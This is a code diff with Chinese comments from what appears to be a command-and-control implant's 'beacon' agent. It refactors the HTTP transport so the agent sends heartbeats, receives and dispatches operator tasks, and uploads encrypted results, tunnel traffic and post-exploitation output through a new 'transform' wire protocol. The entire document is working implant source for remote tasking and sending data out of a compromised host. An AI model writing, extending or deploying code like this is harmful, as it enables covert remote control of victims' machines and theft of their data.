@@ -2,39 +2,21 @@
 
 #if !defined(BEACON_EXTERNAL_TCP_BUILD)
 
-/* 加密并通过 HTTP external 发送所有出站数据包 */
-static VOID FlushOutboxHttp(BeaconContext* ctx, const ByteBuf* heartbeat)
+/* HTTP transform 发送回调：把 encrypted result 与 heartbeat 一起送出，收回任务。 */
+static INT HttpSendEncrypted(BeaconContext* ctx, VOID* ctx_sender,
+                             const ByteBuf* encrypted, ByteBuf* response)
 {
-    OutboxNode* list = OutboxDrain(&ctx->outbox);
-    OutboxNode* cur = list;
+    const ByteBuf* heartbeat = (const ByteBuf*)ctx_sender;
 
-    while (cur) {
-        ByteBuf encrypted;
-        ByteBuf response;
-
-        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted)) {
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return;
-        }
-
-        if (!TransportHttpExchange(&ctx->profile, heartbeat, &encrypted, &response)) {
-            BbFree(&encrypted);
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return;
-        }
-
-        BbFree(&encrypted);
-        BbFree(&response);
-
-        {
-            OutboxNode* done = cur;
-            cur = cur->next;
-            OutboxFreeNode(done);
-        }
+    BbInit(response);
+    if (!TransportHttpTransformExchange(&ctx->profile, heartbeat, encrypted, response)) {
+        BbFree(response);
+        return 0;
     }
+    return 1;
 }
 
-/* HTTP external 主循环：心跳、接收任务、处理、上传结果 */
+/* HTTP external 主循环：新版 transform wire 协议。 */
 INT AgentRunExternalHttp(Agent* agent)
 {
     BeaconContext* ctx;
@@ -45,7 +27,7 @@ INT AgentRunExternalHttp(Agent* agent)
     while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
         ByteBuf plain;
         ByteBuf heartbeat;
-        ByteBuf response;
+        ByteBuf tasks;
 
         BeaconSleep(ctx);
 
@@ -56,14 +38,14 @@ INT AgentRunExternalHttp(Agent* agent)
         }
         BbFree(&plain);
 
-        if (TransportHttpExchange(&ctx->profile, &heartbeat, NULL, &response)) {
-            AgentDispatchTasks(ctx, &response);
+        if (TransportHttpTransformExchange(&ctx->profile, &heartbeat, NULL, &tasks)) {
+            AgentDispatchTasks(ctx, &tasks);
             AgentFlushTransfers(ctx);
             AgentFlushTunnels(ctx);
             AgentFlushCascade(ctx);
             AgentFlushPostEx(ctx);
-            FlushOutboxHttp(ctx, &heartbeat);
-            BbFree(&response);
+            AgentFlushOutbox(ctx, HttpSendEncrypted, &heartbeat);
+            BbFree(&tasks);
         }
 
         BbFree(&heartbeat);
